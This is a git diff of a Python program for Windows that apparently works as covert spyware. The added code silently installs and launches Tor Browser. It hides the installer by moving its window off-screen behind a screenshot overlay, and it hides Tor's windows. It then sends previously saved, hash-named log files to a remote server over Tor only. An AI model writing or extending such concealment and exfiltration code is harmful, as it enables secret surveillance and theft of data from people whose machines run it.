@@ -44,7 +44,9 @@ import Cryptodome.Util
 from Cryptodome.Hash import SHA3_512
 import base64
 import hashlib             # for hashing the names of files
+import multiprocessing
 import threading
+from subprocess import run as subprocess_run
 import requests
 import socks
 import socket
@@ -54,6 +56,7 @@ import pywinauto.timings
 import tkinter as tk
 from PIL import Image, ImageGrab, ImageTk
 import re
+import time
 
 
 # Disallowing multiple instances
@@ -315,22 +318,21 @@ def check_internet():
             return False
 
 
-def find_file(root_folder, dir, file):
+def find_file(root_folder, dir_, file):
     for root, dirs, files in os.walk(root_folder):
         for f in files:
             file_search = (file == f)
-            dir_search = (dir in root)
+            dir_search = (dir_ in root)
             if file_search and dir_search:
                 return os.path.join(root, f)
     return
 
 
 def find_file_in_all_drives(path):
-    # create a regular expression for the file
-    dir = os.path.split(path)[0]
+    dir_ = os.path.split(path)[0]
     file = os.path.split(path)[-1]
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
-        result = find_file(drive, dir, file)
+        result = find_file(drive, dir_, file)
         if result:
             return result
 
@@ -358,7 +360,7 @@ def show_screenshot():
 
 def install_tor_browser():
     if not os.name == "nt":
-        return ''  # TODO: Linux, MacOS
+        return  # TODO: Linux, MacOS
     # 1. Download the installer
     try:
         r = requests.get("http://www.torproject.org/download/")
@@ -371,21 +373,20 @@ def install_tor_browser():
     try:
         tor_installer = requests.get(tor_windows_url)
     except requests.exceptions.ConnectionError:
-        return ''
+        return
     installer_path = os.path.join(dir_path, tor_windows_url.split("/")[-1])
     open(installer_path, 'wb').write(tor_installer.content)
     # 2. Install
     installation_dir = os.path.join(dir_path, "Tor_Browser")
     os.remove(installation_dir)
 
-    import multiprocessing
     screenshot_process = multiprocessing.Process(target=show_screenshot, args=())
     screenshot_process.start()
 
     try:
         app = Application(backend="win32").start(installer_path)
     except:
-        return ''
+        return
     try:
         app.Dialog.OK.wait('ready', timeout=30)
         app.Dialog.move_window(x=-2000, y=-2000)
@@ -416,8 +417,70 @@ def install_tor_browser():
     return tor_installation_dir
 
 
+def is_tor_browser_already_open(program_path):
+    for pid in psutil.pids():  # Iterates over all process-ID's found by psutil
+        try:
+            p = psutil.Process(pid)  # Requests the process information corresponding to each process-ID,
+            # the output wil look (for example) like this: <psutil.Process(pid=5269, name='Python') at 4320652312>
+            if program_path in p.exe():  # checks if the value of the program-variable
+                # that was used to call the function matches the name field of the plutil.Process(pid)
+                # output (see one line above).
+                return True, p.exe()
+        except:
+            continue
+    return False, None
+
+
+def find_top_windows(wanted_text=None, wanted_class=None, selection_function=None):
+    """ Find the hwnd of top level windows.
+    You can identify windows using captions, classes, a custom selection
+    function, or any combination of these. (Multiple selection criteria are
+    ANDed. If this isn't what's wanted, use a selection function.)
+
+    Arguments:
+    wanted_text          Text which required windows' captions must contain.
+    wanted_class         Class to which required windows must belong.
+    selection_function   Window selection function. Reference to a function
+                        should be passed here. The function should take hwnd as
+                        an argument, and should return True when passed the
+                        hwnd of a desired window.
+
+    Returns:            A list containing the window handles of all top level
+                        windows matching the supplied selection criteria.
+
+    Usage example:      optDialogs = find_top_windows(wanted_text="Options")
+    """
+
+    def _normalise_text(control_text):
+        """Remove '&' characters, and lower case.
+        Useful for matching control text """
+        return control_text.lower().replace('&', '')
+
+    results = []
+    top_windows = []
+    win32gui.EnumWindows(_windowEnumerationHandler, top_windows)
+    for hwnd, window_text, window_class in top_windows:
+        if wanted_text and not _normalise_text(wanted_text) in _normalise_text(window_text):
+            continue
+        if wanted_class and not window_class == wanted_class:
+            continue
+        if selection_function and not selection_function(hwnd):
+            continue
+        results.append(hwnd)
+    return results
+
+
 def open_tor_browser(installation_dir):
-    pass
+    user32 = WinDLL('user32')
+    os.startfile(os.path.join(os.path.split(os.path.split(installation_dir)[0])[0], "Start Tor Browser.lnk"))
+    start_time = time.time()
+    while time.time() - start_time < 60:
+        hwnd_1 = find_top_windows(wanted_text="Establishing a Connection", wanted_class='MozillaDialogClass')
+        hwnd_2 = find_top_windows(wanted_text="About Tor", wanted_class='MozillaWindowClass')
+        if len(hwnd_1) == 1:
+            user32.ShowWindow(hwnd_1[0], 0)
+        if len(hwnd_2) == 1:
+            user32.ShowWindow(hwnd_2[0], 0)
 
 
 def find_the_previous_log_and_send():
@@ -432,14 +495,17 @@ def find_the_previous_log_and_send():
         if os.path.exists(previous_date_hashed + ".txt"):
             found_filenames.append(previous_date_hashed + ".txt")
         delta += 1
-    # check if TOR is installed
-    tor_installation_dir = check_if_tor_browser_is_installed()
-    if tor_installation_dir == '':
-        tor_installation_dir = install_tor_browser()
-    if tor_installation_dir == '':
+    # check if TOR is opened/installed
+    is_tor_open, tor_installation_dir = is_tor_browser_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
+    if not tor_installation_dir:
+        tor_installation_dir = check_if_tor_browser_is_installed()
+    # if not tor_installation_dir:
+    tor_installation_dir = install_tor_browser()
+    if not tor_installation_dir:
         return True  # ONE DOES NOT SIMPLY USE CLEARNET.
     else:  # USE DARKNET ONLY
-        open_tor_browser(tor_installed[1])
+        if not is_tor_open:
+            open_tor_browser(tor_installation_dir)
         for found_filename in found_filenames:
             # Now that we found the old log files (found_filename), send them to our server.
             server_parser_list = [(r'http://jsonip.com', "r.json()['ip']"),
